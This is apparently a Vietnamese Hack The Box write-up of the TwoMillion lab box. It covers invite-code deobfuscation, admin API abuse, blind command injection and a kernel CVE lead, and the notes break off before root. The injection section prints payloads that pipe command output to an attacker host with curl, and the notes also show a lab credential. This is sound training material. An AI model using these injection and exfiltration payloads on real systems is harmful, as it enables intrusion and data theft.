---
title: 
draft: false
tags:
  - linux
  - easy
  - CVE-2023-0386
---
Sau một khoảng thời gian dài chạy dự án miệt mài thì hôm nay trở về SG đã quay lại với HTB cùng với anh D7cky cùng với banker nữ. Lựa chọn khởi động với một bài Easy là quá hợp lý.
# Description

> TwoMillion is an Easy difficulty Linux box that was released to celebrate reaching 2 million users on HackTheBox. The box features an old version of the HackTheBox platform that includes the old hackable invite code. After hacking the invite code an account can be created on the platform. The account can be used to enumerate various API endpoints, one of which can be used to elevate the user to an Administrator. With administrative access the user can perform a command injection in the admin VPN generation endpoint thus gaining a system shell. An .env file is found to contain database credentials and owed to password re-use the attackers can login as user admin on the box. The system kernel is found to be outdated and CVE-2023-0386 can be used to gain a root shell.
### Recon:

- nmap:

```jsx
Nmap scan report for 10.129.97.220 
Host is up (0.24s latency). 
Not shown: 65533 closed tcp ports (reset) 
PORT   STATE SERVICE 
22/tcp open  ssh 
80/tcp open  http
```

- Dô web xem trước nào
![[Pasted image 20250109233934.png]]Web là hình ảnh của Platform của HTB ngày xưa. Woa ngày xưa HTB như thế này sao, nhìn nghệ phết ✌️

- Sau khi khám phá các chức năng của web thì chỉ có một số chức năng thực hiện được như login, Join HTB.
- Thử vào chức năng Join HTB
![[Pasted image 20250109234000.png]]Ngày xưa muốn vào HTB phải có mã giới thiệu 🙂 . Thử gửi request xem có gì không
![[Pasted image 20250109234014.png]]- Có request gửi đi qua URL /api/v1/invite/verify . nhưng khi xem html thì k thấy form có URL này
![[Pasted image 20250109234033.png]]
Vậy thì có lẻ nó đã xử lý action qua js. Sau khi tìm qua js thì thấy có một file js obfuscate tên inviteapi.min.js

```jsx
eval(
  function (p, a, c, k, e, d) {
    e = function (c) {
      return c.toString(36)
    };
    if (!''.replace(/^/, String)) {
      while (c--) {
        d[c.toString(a)] = k[c] ||
        c.toString(a)
      }
      k = [
        function (e) {
          return d[e]
        }
      ];
      e = function () {
        return '\\\\w+'
      };
      c = 1
    };
    while (c--) {
      if (k[c]) {
        p = p.replace(new RegExp('\\\\b' + e(c) + '\\\\b', 'g'), k[c])
      }
    }
    return p
  }(
    '1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\\'/d/e/n\\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\\'/d/e/k/l/m\\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',
    24,
    24,
    'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'),
    0,
    {
    }
  )
)

```

Đây là một dạng obfuscate bằng việc sử dụng hàm eval để thực thi một function thực hiện thay thế và vòng lặp để lưu lại vào biến k trở thành mã gốc. Sẽ có rất nhiều cách để giải mã được đoạn code obfuscate này :

- Sử dụng console log: bằng cách mở console và gõ: console.log(code)
![[Pasted image 20250109234135.png]]

```jsx
function verifyInviteCode(code) {
    var formData = {
        "code": code
    };
    $.ajax({
        type: "POST",
        dataType: "json",
        data: formData,
        url: '/api/v1/invite/verify',
        success: function (response) {
            console.log(response)
        },
        error: function (response) {
            console.log(response)
        }
    })
}

function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/how/to/generate',
        success: function (response) {
            console.log(response)
        },
        error: function (response) {
            console.log(response)
        }
    })
}
```
- Dùng debug của dev tool. đặt break point

![[Pasted image 20250109234247.png]]- Sau khi deobfuscate xong thì thấy có một API nữa nhìn rất hấp dẫn: /api/v1/invite/how/to/generate
![[Pasted image 20250109234501.png]]Trả về một đoạn mã hóa dạn ROT13 → đi giải mã thôi :![[Pasted image 20250109234526.png]]
- xuất hiện một URL /api/v1/invite/generate gọi luôn xem sao![[Pasted image 20250109234543.png]]
- trả về một code dạng base 64, giải mã luôn nào![[Pasted image 20250109234603.png]]
- Từ đoạn code đó thì mình có thể join HTB rùi 🙂![[Pasted image 20250109234621.png]]
- Sau khi nhập thành công và Đăng ký![[Pasted image 20250109234637.png]]
- Bây giờ khám phá các chức năng trong này thôi thì có chức năng Access thì có thể tạo một file vpn![[Pasted image 20250109234652.png]]
- Ta thấy request gửi về URL: /api/v1/user/vpn/generate . nhưng không làm được gì. hơi vô vọng một tí. Sau khi khám phá hết chức năng thì k có gì đáng giá nên quyết định recon thêm tí. Thấy URL là api thì có thể đệ lộ gì k. Thực hiện xóa và gửi request tới /api![[Pasted image 20250109234707.png]]
- Á à nó bị Directory listing, tiếp tục với /api/v1![[Pasted image 20250109234728.png]]
- Yeah đã list được all API của app rùi. Thực hiện lần lân xem các API có gì hót. Các API của user thì đã thấy hết rồi nên k có gì hot. “Sự chú ý của ta va vào ánh mắt của nàng” chính là admin. Thực hiện lần lượt thử nào dùng được không.![[Pasted image 20250109234813.png]]
- → Từ những kết quả trên thì ta thấy API `/api/v1/admin/auth` `/api/v1/admin/settings/update` này đang bị lỗi Author rùi khi cho phép user thực hiện. Nhưng quan trọng ở đây là request update. Bây giờ nó đang báo lỗi thì ta thực hiện tìm ra body của nó :))))

- Đầu tiên sẽ sửa `Content-Type: application/json` :![[Pasted image 20250109234839.png]]
- “À bạn thiếu thì tui thêm :)))”![[Pasted image 20250109234854.png]]
- “Thiếu tiếp thì tui thêm tiếp :)))”![[Pasted image 20250109234908.png]]
→ Đã thành công chuyển user thành user admin

- Thì bây giờ ta nhớ là còn 1 request của admin bị 401 thì bây giờ mình đã `“ở cương vị mới”` thì mình thực hiện được.![[Pasted image 20250109234937.png]]
- Yeah được rùi giờ, giờ thử request cho đúng thôi :VVVV![[Pasted image 20250109235005.png]]Thực hiện thành công rùi nhé. Chức năng này sẽ thực hiện Gen ra file vpn cho username nhập vào bất kì.![[Pasted image 20250109235021.png]]
- ### Command Injection

- Là một thói quen của một hacker lỏ thì phải đưa nháy vào xem thử có gì khác biệt không :))))![[Pasted image 20250109235050.png]]
- - Có gì đó khác biệt ở đây. Và linh tính của tổ nghề mách bảo là “fuzzz tới luôn đi con” thì mình fuzz tiếp. Sau khi thử nghiệm thì có lẻ nó đang có một sai sót gì khi cho vào các ký tự đặc biệt như ;, ’, | . Thì dừng lại suy nghĩ một xíu. Chức năng này hoạt động ở server như nào nhỉ?.
- Thì nó sẽ là: Nhận vào username và đem username đó thực hiện một command để Gen ra một file vpn theo username đó, thì có lẽ nó đã nối username vào command tạo vpn → **`Command injection`**
- Sau khi thử nghiệm các payload command injection thông thường nó không trả về gì. Thì khả năng nó phải là blind. Để xác thực suy đoán thì chỉ cần dựng một server cho nó curl về thử được không ?
- Thực hiện với payload: `;curl [<http://10.10.14.13:8000>](<http://10.10.14.13:8000/>)`
![[Pasted image 20250109235116.png]]
- Đã có request trả về
![[Pasted image 20250109235138.png]]- Thành công rồi. Giờ chỉ cần chạy command trả thông tin về trong lệnh curl là được

```jsx
"aaaaaaaaaaaaaaaaaaa;curl -G --data-urlencode \\"env=$(ls)\\" <http://10.10.14.13:8000>"
```
![[Pasted image 20250109235208.png]]
- Đã chạy command được thành công. Bây giờ thực hiện khám phá và đọc flag. Thực hiện recon một vài thông tin của user này: www-data, /var/www/html, nội dung file .evn (file config ứng dụng trên PHP)
- Kiếm flag và cat thui :)))). Nhưng đời không như là mơ, khi flag để trong thư mục của user admin. và không có quyền đọc. Tại đây nhớ lại mình có một Credential trong file .env (admin/SuperDuperPass123) và có port 22. Thử ssh.
![[Pasted image 20250109235302.png]]
→ SSH thành công. Lụm flag thui :))))
### Flag 1
![[Pasted image 20250109235334.png]]
### Privileges Escalation

- Giờ thì leo từ admin lên root là xong.
- Thu thập các thông tin để leo quyền:
    - sudo -l : not working
    - uname -a: Linux 2million 5.15.70-051570-generic #202209231339 SMP Fri Sep 23 13:45:37 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux

→ từ những thông tin đó thì đi Search thì thấy có một CVE Privileges escalation : `CVE-2023-0386` khi version của kernel lower than 6.2

To be continue …..